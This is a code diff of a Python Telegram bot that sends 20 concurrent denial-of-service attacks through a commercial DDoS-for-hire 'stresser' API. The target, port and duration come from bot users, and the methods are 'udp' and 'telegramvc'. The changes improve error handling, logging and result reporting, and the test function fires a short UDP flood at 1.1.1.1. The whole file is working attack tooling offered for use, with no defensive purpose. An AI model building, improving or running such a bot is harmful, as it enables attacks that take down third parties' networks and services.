@@ -1,4 +1,4 @@
-# app.py - API Only (20 Concurrent)
+# app.py - API Only with Better Error Handling
 import os
 import logging
 import asyncio
@@ -37,13 +37,14 @@ def index():
 def health():
     return jsonify({"status": "healthy", "timestamp": datetime.now().isoformat()})
 
-# ===== API ATTACK =====
+# ===== API ATTACK WITH BETTER HANDLING =====
 async def api_attack(target, port, duration, attack_id):
-    """Send attack via API"""
+    """Send attack via API with detailed response"""
     url = "https://api.susstresser.com/panel/api/api.php"
     
-    # Try different methods
+    # Try both methods
     methods = ["udp", "telegramvc"]
+    results = []
     
     for method in methods:
         params = {
@@ -62,34 +63,45 @@ async def api_attack(target, port, duration, attack_id):
         }
         
         try:
-            timeout = aiohttp.ClientTimeout(total=10)
+            timeout = aiohttp.ClientTimeout(total=15)
             async with aiohttp.ClientSession(timeout=timeout) as session:
                 start_time = time.time()
                 async with session.get(url, params=params, headers=headers) as response:
                     elapsed = time.time() - start_time
                     result_text = await response.text()
                     
+                    logger.info(f"Attack {attack_id} - Method {method}: Status {response.status}, Time: {elapsed:.2f}s")
+                    logger.info(f"Response: {result_text[:200]}")
+                    
                     if response.status == 200:
-                        logger.info(f"✅ API Attack {attack_id} SUCCESS with method {method}")
                         return {
                             "success": True,
                             "attack_id": attack_id,
                             "method": method,
                             "status": response.status,
                             "elapsed": f"{elapsed:.2f}s",
-                            "response": result_text[:100] if result_text else "Success"
+                            "response": result_text[:200] if result_text else "Success"
                         }
                     else:
-                        logger.info(f"⚠️ API Attack {attack_id} returned {response.status}")
+                        results.append({
+                            "method": method,
+                            "status": response.status,
+                            "response": result_text[:100]
+                        })
                         
+        except asyncio.TimeoutError:
+            logger.error(f"Attack {attack_id} - Method {method}: Timeout")
+            results.append({"method": method, "error": "Timeout"})
         except Exception as e:
-            logger.error(f"API Attack {attack_id} with method {method} failed: {e}")
-            continue
+            logger.error(f"Attack {attack_id} - Method {method}: {str(e)}")
+            results.append({"method": method, "error": str(e)})
     
+    # If we get here, all methods failed
     return {
         "success": False,
         "attack_id": attack_id,
         "method": "failed",
+        "results": results,
         "error": "All methods failed"
     }
 
@@ -97,6 +109,7 @@ async def api_attack(target, port, duration, attack_id):
 async def start_20_api_attacks(target, port, duration):
     """Launch 20 concurrent API attacks"""
     logger.info(f"🔥 Starting 20 concurrent API attacks on {target}:{port} for {duration}s")
+    logger.info(f"🔑 API Key: {API_KEY[:10]}...")
     
     # Create 20 attack tasks
     tasks = []
@@ -109,7 +122,15 @@ async def start_20_api_attacks(target, port, duration):
     
     # Count successes
     success_count = sum(1 for r in results if r.get('success', False))
-    total_time = sum(float(r.get('elapsed', '0').replace('s', '')) for r in results if r.get('elapsed'))
+    
+    # Collect detailed results
+    detailed_results = []
+    for r in results:
+        if r.get('success'):
+            detailed_results.append(f"✅ Attack {r['attack_id']}: {r['method']} - {r['status']} ({r['elapsed']})")
+        else:
+            error_msg = r.get('error', 'Unknown error')
+            detailed_results.append(f"❌ Attack {r.get('attack_id', 'N/A')}: {error_msg}")
     
     logger.info(f"✅ API Attacks complete: {success_count}/20 successful")
     
@@ -119,6 +140,7 @@ async def start_20_api_attacks(target, port, duration):
         "successful": success_count,
         "failed": len(results) - success_count,
         "results": results,
+        "detailed_results": detailed_results[:10],  # First 10 results
         "target": target,
         "port": port,
         "duration": duration
@@ -191,27 +213,29 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 f"📊 Attacks: `{result['successful']}/{result['total_attacks']} SUCCESSFUL`\n"
                 f"❌ Failed: `{result['failed']}`\n"
                 f"⚡ Status: ✅ SUCCESS\n\n"
-                f"📊 *Attack Results:*\n"
+                f"📊 *Results:*\n"
             )
             
-            for r in result['results'][:10]:
-                status = "✅" if r.get('success') else "❌"
-                method = r.get('method', 'N/A')
-                status_code = r.get('status', 'N/A')
-                elapsed = r.get('elapsed', 'N/A')
-                response_text += f"{status} Attack {r.get('attack_id', 'N/A')}: {method} - {status_code} ({elapsed})\n"
+            for detail in result['detailed_results']:
+                response_text += f"{detail}\n"
             
             if len(result['results']) > 10:
                 response_text += f"... and {len(result['results']) - 10} more\n"
         else:
+            # Show detailed failure
             response_text = (
                 f"❌ *API ATTACK FAILED*\n\n"
                 f"🎯 Target: `{target}`\n"
                 f"📡 Port: `{port}`\n"
                 f"⏱️ Time: `{duration}s`\n"
                 f"📊 Status: ❌ FAILED\n\n"
-                f"Check API key or connection."
+                f"📊 *Error Details:*\n"
             )
+            
+            for detail in result['detailed_results'][:5]:
+                response_text += f"{detail}\n"
+            
+            response_text += f"\n💡 Check if API key is valid or API is reachable."
         
         await status_msg.edit_text(response_text, parse_mode='Markdown')
         
@@ -286,7 +310,8 @@ async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 f"🎯 Target: `{target}`\n"
                 f"📡 Port: `{port}`\n"
                 f"⏱️ Time: `{duration}s`\n"
-                f"📊 Status: ❌ FAILED"
+                f"📊 Status: ❌ FAILED\n\n"
+                f"Check API connection or key."
             )
         
         await status_msg.edit_text(response_text, parse_mode='Markdown')
@@ -304,31 +329,53 @@ async def test_api_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.answer("Access denied!", show_alert=True)
         return
     
-    await query.edit_message_text("🔬 Testing API connection...")
+    await query.edit_message_text("🔬 Testing API connection...\n\n⏳ Sending test request...")
     
-    url = f"https://api.susstresser.com/panel/api/api.php?key={API_KEY}&host=1.1.1.1&port=80&time=10&method=udp"
+    # Test with both methods
+    test_results = []
     
-    try:
-        timeout = aiohttp.ClientTimeout(total=10)
-        async with aiohttp.ClientSession(timeout=timeout) as session:
-            async with session.get(url) as response:
-                text = await response.text()
-                
-                await query.edit_message_text(
-                    f"🔬 *API TEST RESULTS*\n\n"
-                    f"📡 Status: {response.status}\n"
-                    f"🔑 API Key: {API_KEY[:10]}...{API_KEY[-4:] if len(API_KEY) > 14 else ''}\n"
-                    f"📝 Response: {text[:300]}\n\n"
-                    f"{'✅ API is responding!' if response.status == 200 else '❌ API Error!'}",
-                    parse_mode='Markdown',
-                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
-                )
-    except Exception as e:
-        await query.edit_message_text(
-            f"❌ *API ERROR*\n\n{str(e)}",
-            parse_mode='Markdown',
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
-        )
+    for method in ["udp", "telegramvc"]:
+        url = f"https://api.susstresser.com/panel/api/api.php?key={API_KEY}&host=1.1.1.1&port=80&time=10&method={method}"
+        
+        try:
+            timeout = aiohttp.ClientTimeout(total=10)
+            async with aiohttp.ClientSession(timeout=timeout) as session:
+                start_time = time.time()
+                async with session.get(url) as response:
+                    elapsed = time.time() - start_time
+                    text = await response.text()
+                    
+                    test_results.append({
+                        "method": method,
+                        "status": response.status,
+                        "elapsed": f"{elapsed:.2f}s",
+                        "response": text[:200]
+                    })
+        except Exception as e:
+            test_results.append({
+                "method": method,
+                "error": str(e)
+            })
+    
+    # Build response
+    response_text = "🔬 *API TEST RESULTS*\n\n"
+    response_text += f"🔑 API Key: `{API_KEY[:10]}...{API_KEY[-4:]}`\n\n"
+    
+    for result in test_results:
+        if "error" in result:
+            response_text += f"❌ {result['method'].upper()}: Error - {result['error']}\n"
+        else:
+            status = "✅" if result['status'] == 200 else "❌"
+            response_text += f"{status} {result['method'].upper()}: {result['status']} ({result['elapsed']})\n"
+            response_text += f"   Response: `{result['response'][:100]}...`\n\n"
+    
+    response_text += "\n" + ("✅ API is working!" if any(r.get('status') == 200 for r in test_results) else "❌ API is not responding!")
+    
+    await query.edit_message_text(
+        response_text,
+        parse_mode='Markdown',
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
+    )
 
 async def status_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
